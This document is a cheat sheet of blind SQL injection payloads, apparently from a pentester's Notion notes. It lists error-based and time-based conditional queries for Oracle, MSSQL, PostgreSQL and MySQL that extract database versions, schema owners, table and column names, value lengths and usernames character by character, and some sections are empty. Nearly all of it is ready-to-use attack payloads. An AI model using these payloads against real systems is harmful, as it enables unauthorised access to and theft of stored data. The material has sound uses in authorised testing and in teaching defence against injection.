# SQL Injection Payloads

## Information Inference

## Enumerate Version

### Oracle (error based)

```sql
((SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT rownum rn, table_name FROM all_tables) WHERE rn = ^FUZZ^),1,1)='^FUZZ^' THEN TO_CHAR(1/0) ELSE NULL END FROM dual))
```

### Oracle (time based)

```sql
((SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT rownum rn, table_name FROM all_tables) WHERE rn = ^FUZZ^),1,1)='^FUZZ^' THEN dbms_pipe.receive(('a'),10) ELSE NULL END FROM dual))
```

### MSSQL (error based)

```sql
IF ((SELECT SUBSTRING((SELECT @@version),1,1))='m') BEGIN THROW 500001, 'THING', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT SUBSTRING((SELECT @@version),1,1))='m') WAITFOR DELAY '0:0:02'
```

<aside>
💡 PostgreSQL does not have a way to trigger conditional errors without being inside a function or a DO block. Both of which have a lot of likely bad characters.

</aside>

### PostgreSQL (error based)

```sql
SELECT CASE WHEN (SELECT SUBSTRING((SELECT version()), 1, 1))='P' THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based)

```sql
SELECT CASE WHEN (SELECT SUBSTRING((SELECT version()), 1, 1))='P' THEN (SELECT pg_sleep(5)) ELSE NULL END
```

### MySQL (error based)

```sql
SELECT IF ((SELECT SUBSTRING((SELECT @@version),1,1))='8', (SELECT table_name FROM information_schema.tables), 'a') AS Result;
```

### MySQL (time based)

```sql
SELECT IF ((SELECT SUBSTRING((SELECT @@version),1,1))='8', (SELECT SLEEP(2)), (SELECT 'A')) AS Result;
```

## Enumerate rows returned of distinct table owners

### Oracle (error based)

```sql
((SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROWNUM RN, COLUMN_NAME, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'HS_BULKLOAD_VIEW_OBJ'))=2 THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL))
```

### Oracle (time based)

```sql
((SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROWNUM RN, COLUMN_NAME, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'HS_BULKLOAD_VIEW_OBJ'))=2 THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL))
```

<aside>
💡 MSSQL works a little differently, you have to enumerate schema names and the owners of those respective schemas.

</aside>

### MSSQL (error based)

```sql
IF ((SELECT MAX(RN) FROM (SELECT DISTINCT owner_name AS owner, RN FROM (SELECT RN, owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS subquery) AS mainquery) AS thing))=12 BEGIN THROW 500001, 'THING', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT MAX(RN) FROM (SELECT DISTINCT owner_name AS owner, RN FROM (SELECT RN, owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS subquery) AS mainquery) AS thing))=12 WAITFOR DELAY '0:0:02'
```

<aside>
💡 PostgreSQL works similar to MSSQL where you have to enumerate the schema name, schema owner, and then use the results to determine what you’re able to access.

</aside>

### PostgreSQL (error based) (schema names)

```sql
(SELECT CASE WHEN (SELECT MAX(RN) AS RN FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN FROM (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS THING) AS THING)=3 THEN 1/(SELECT 0) ELSE NULL END)
```

### PostgreSQL (time based) (schema names)

```sql
(SELECT CASE WHEN (SELECT MAX(RN) AS RN FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN FROM (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS THING) AS THING)=3 THEN (SELECT pg_sleep(5)) ELSE NULL END)
```

### PostgreSQL (error based) (schema owners)

```sql
SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS thing) AS subquery)=6 THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based) (schema owners)

```sql
SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS thing) AS subquery)=6 THEN (SELECT pg_sleep(10)) ELSE NULL END
```

<aside>
💡 In MySQL there is no direct way to determine ownership of tables or schemas like in the other DBMS’s.

</aside>

## Enumerate Table Owners

### Oracle (error based)

```sql
(SELECT CASE WHEN SUBSTR((SELECT OWNER FROM (SELECT ROWNUM RN, OWNER FROM (SELECT DISTINCT OWNER FROM (SELECT ROWNUM RN, OWNER FROM ALL_TABLES))) WHERE RN = 1),1,1)='A' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)
```

### Oracle (time based)

```sql
(SELECT CASE WHEN SUBSTR((SELECT OWNER FROM (SELECT ROWNUM RN, OWNER FROM (SELECT DISTINCT OWNER FROM (SELECT ROWNUM RN, OWNER FROM ALL_TABLES))) WHERE RN = 1),1,1)='A' THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL)
```

<aside>
💡 MSSQL works a little differently, you have to enumerate schema names and the owners of those respective schemas.

</aside>

### MSSQL (error based) (schema name)

```sql
IF ((SELECT SUBSTRING((SELECT schema_name FROM (SELECT * FROM (SELECT ROW_NUMBER() OVER (ORDER BY schema_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS SubqueryAlias WHERE RN = 1) AS thing),1,1)))='A' BEGIN THROW 500001, 'THING', 1; END 
```

### MSSQL (time based) (schema name)

```sql
IF ((SELECT SUBSTRING((SELECT schema_name FROM (SELECT * FROM (SELECT ROW_NUMBER() OVER (ORDER BY schema_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS SubqueryAlias WHERE RN = 1) AS thing),1,1)))='A' WAITFOR DELAY '0:0:02'
```

### MSSQL (error based) (schema owner)

```sql
IF ((SELECT SUBSTRING((SELECT owner_name FROM (SELECT * FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS SubqueryAlias WHERE RN = 1) AS thing),1,1)))='d' BEGIN THROW 500001, 'THING', 1; END
```

### MSSQL (time based) (schema owner)

```sql
IF ((SELECT SUBSTRING((SELECT owner_name FROM (SELECT * FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS SubqueryAlias WHERE RN = 1) AS thing),1,1)))='d' WAITFOR DELAY '0:0:02'
```

<aside>
💡 PostgreSQL works similar to MSSQL where you have to enumerate the schema name, schema owner, and then use the results to determine what you’re able to access.

</aside>

### PostgreSQL (error based) (schema name)

```sql
SELECT CASE WHEN (SELECT SUBSTR((SELECT table_schema FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN, table_schema FROM  (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS thing) AS thing WHERE RN = 1),1,1))='I' THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based) (schema name)

```sql
SELECT CASE WHEN (SELECT SUBSTR((SELECT table_schema FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN, table_schema FROM  (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS thing) AS thing WHERE RN = 1),1,1))='I' THEN (SELECT pg_sleep(5)) ELSE NULL END
```

### PostgreSQL (error based) (schema owner)

```sql
SELECT CASE WHEN (SUBSTR((SELECT owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY schema_name) AS RN, schema_name, owner_name FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS THING) AS THING WHERE RN = 1),1,1))='p' THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based) (schema owner)

```sql
SELECT CASE WHEN (SUBSTR((SELECT owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY schema_name) AS RN, schema_name, owner_name FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS THING) AS THING WHERE RN = 1),1,1))='p' THEN (SELECT pg_sleep(5)) ELSE NULL END
```

<aside>
💡 In MySQL there is no way to directly view owners of tables like in other DBMS’s

</aside>

### MySQL (error based)

```sql

```

### MySQL (time based)

```sql

```

## Enumerate Table Names Owned by Users

### Oracle (error based)

```sql
SELECT CASE WHEN SUBSTR((SELECT TABLE_NAME FROM (SELECT rownum rn, table_name, owner FROM all_tables WHERE OWNER = 'SYS') WHERE RN=1),1,1)='d' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL
```

### Oracle (time based)

```sql
SELECT CASE WHEN SUBSTR((SELECT TABLE_NAME FROM (SELECT rownum rn, table_name, owner FROM all_tables WHERE OWNER = 'SYS') WHERE RN=1),1,1)='d' THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL
```

<aside>
💡 MSSQL works differently, you have to enumerate tables owned by the schema name. In order to do this, you have to know who you are acting as.

</aside>

### MSSQL (error based) (whoami)

```sql
IF ((SELECT SUBSTRING((SELECT SESSION_USER AS CurrentUser),1,1) AS CurrentUser)='a') BEGIN THROW 500001, 'ERROR', 1; END
```

```sql
IF ((SELECT SUBSTRING((SELECT SESSION_USER AS CurrentUser),1,1) AS CurrentUser)='a') BEGIN THROW 500001, 'ERROR', 1; END
```

### MSSQL (time based) (whoami)

```sql
IF ((SELECT SUBSTRING((SELECT USER_NAME() AS CurrentUser),1,1) AS CurrentUser)='U') WAITFOR DELAY '0:0:02'
```

```sql
IF ((SELECT SUBSTRING((SELECT USER_NAME() AS CurrentUser),1,1) AS CurrentUser)='a') BEGIN THROW 500001, 'ERROR', 1; END
```

### MSSQL (error based) (tables owned by schema name)

```sql
IF ((SELECT SUBSTRING((SELECT TABLE_SCHEMA FROM (SELECT ROW_NUMBER() OVER (ORDER BY TABLE_SCHEMA) AS RN, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES) AS THING WHERE RN=1),1,1)))='a' BEGIN THROW 500001, 'ERROR', 1; END
```

### MSSQL (time based) (tables owned by schema name)

```sql
IF ((SELECT SUBSTRING((SELECT TABLE_SCHEMA FROM (SELECT ROW_NUMBER() OVER (ORDER BY TABLE_SCHEMA) AS RN, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES) AS THING WHERE RN=1),1,1)))='a' WAITFOR DELAY '0:0:02'
```

### PostgreSQL (error based)

```sql

```

### PostgreSQL (time based)

```sql

```

<aside>
💡 In MySQL there is no direct way to view owners of tables like in other DBMS’s, instead you have to enumerate the table name.

</aside>

### MySQL (error based)

```sql
SELECT IF ((SELECT SUBSTRING((SELECT TABLE_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES, (SELECT @row_number:=0) AS RN) AS RESULT WHERE RN = 1),1,1)) = 'C', (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES), 'a') AS RESULT;
```

### MySQL (time based

```sql
SELECT IF ((SELECT SUBSTRING((SELECT TABLE_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES, (SELECT @row_number:=0) AS RN) AS RESULT WHERE RN = 1),1,1)) = 'C', (SELECT SLEEP(10)), 'a') AS RESULT
```

## Enumerate Column Names of Tables

### Oracle (error based)

```sql
SELECT CASE WHEN SUBSTR((SELECT COLUMN_NAME FROM (select rownum rn, column_name from all_tab_columns WHERE TABLE_NAME = 'SYSTEM_PRIVILEGE_MAP') WHERE RN = 1),1,1)='A' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL
```

### Oracle (time based)

```sql
SELECT CASE WHEN SUBSTR((SELECT COLUMN_NAME FROM (select rownum rn, column_name from all_tab_columns WHERE TABLE_NAME = 'SYSTEM_PRIVILEGE_MAP') WHERE RN = 1),1,1)='A' THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL
```

### MSSQL (error based)

```sql
IF ((SELECT SUBSTRING((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN, COLUMN_NAME FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'ForgeRock') AS THING) AS THING WHERE RN=1),1,1)))='A' BEGIN THROW 500001, 'ERROR', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT SUBSTRING((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN, COLUMN_NAME FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'ForgeRock') AS THING) AS THING WHERE RN=1),1,1)))='A' WAITFOR DELAY '0:0:02'
```

### PostgreSQL (error based)

```sql

```

### PostgreSQL (time based)

```sql

```

### MySQL (error based)

```sql
SELECT IF((SELECT SUBSTRING((SELECT COLUMN_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS, (SELECT @row_number:=0) AS RN WHERE TABLE_NAME = 'CHARACTER_SETS') AS RESULT WHERE RN = 1),1,1))='C', (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES), 'A')
```

### MySQL (time based

```sql
SELECT IF((SELECT SUBSTRING((SELECT COLUMN_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS, (SELECT @row_number:=0) AS RN WHERE TABLE_NAME = 'CHARACTER_SETS') AS RESULT WHERE RN = 1),1,1))='C', (SELECT SLEEP(10)), 'A')
```

## Enumerate length of column values

### Oracle (error based)

```sql
SELECT CASE WHEN (SELECT LENGTH(NAME) length FROM (SELECT rownum rn, name from SYSTEM_PRIVILEGE_MAP) WHERE RN = 1)<1 THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL
```

### Oracle (time based)

```sql
SELECT CASE WHEN (SELECT LENGTH(NAME) length FROM (SELECT rownum rn, name from SYSTEM_PRIVILEGE_MAP) WHERE RN = 1)<1 THEN dbms_pipe.receive_message(('a'), 10) ELSE NULL END FROM DUAL
```

### MSSQL (error based)

```sql
IF ((SELECT LEN(productName) AS Length FROM (SELECT productName FROM (SELECT ROW_NUMBER() OVER (ORDER BY productName) AS RN, productName FROM ForgeRock) AS THING WHERE RN=1) AS THING))=6 BEGIN THROW 500001, 'ERROR', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT LEN(productName) AS Length FROM (SELECT productName FROM (SELECT ROW_NUMBER() OVER (ORDER BY productName) AS RN, productName FROM ForgeRock) AS THING WHERE RN=1) AS THING))=6 WAITFOR DELAY '0:0:02'
```

### PostgreSQL (error based)

```sql
SELECT CASE WHEN (SELECT LENGTH FROM (SELECT ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RN, TABLE_NAME, LENGTH(TABLE_NAME) AS LENGTH FROM INFORMATION_SCHEMA.TABLES) AS THING WHERE RN = 1)=33 THEN 1/(SELECT 0) ELSE NULL END AS THING
```

### PostgreSQL (time based)

```sql
SELECT CASE WHEN (SELECT LENGTH FROM (SELECT ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RN, TABLE_NAME, LENGTH(TABLE_NAME) AS LENGTH FROM INFORMATION_SCHEMA.TABLES) AS THING WHERE RN = 1)=33 THEN (SELECT pg_sleep(10)) ELSE NULL END AS THING
```

### MySQL (error based)

```sql
SELECT IF((SELECT LENGTH(COLUMN_NAME) FROM (SELECT COLUMN_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS, (SELECT @row_number:=0) AS RN WHERE TABLE_NAME = 'CHARACTER_SETS') AS RESULT WHERE RN = 1) AS THING)=18, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES), 'A')
```

### MySQL (time based

```sql
SELECT IF((SELECT LENGTH(COLUMN_NAME) FROM (SELECT COLUMN_NAME FROM (SELECT (@row_number:=@row_number + 1) AS RN, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS, (SELECT @row_number:=0) AS RN WHERE TABLE_NAME = 'CHARACTER_SETS') AS RESULT WHERE RN = 1) AS THING)=18, (SELECT SLEEP(10)), 'A')
```

## Enumerate values of columns

<aside>
💡 Conceptually, this is the same concept used to create the above payloads. You can modify any of the above to fit your desired use case.

</aside>

### Oracle

```sql
(SELECT CASE WHEN SUBSTR((SELECT USERNAME FROM (SELECT ROWNUM RN, USERNAME FROM USERS) WHERE RN=1),1,1)='A' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)
```

[Payload syntaxes](https://www.notion.so/Payload-syntaxes-7d1a9ea1ba584b689f40210d2401e8a6?pvs=21)

[Time-based discovery payloads](https://www.notion.so/Time-based-discovery-payloads-5c41991ce9774215abce9ed8f50c1fb8?pvs=21)
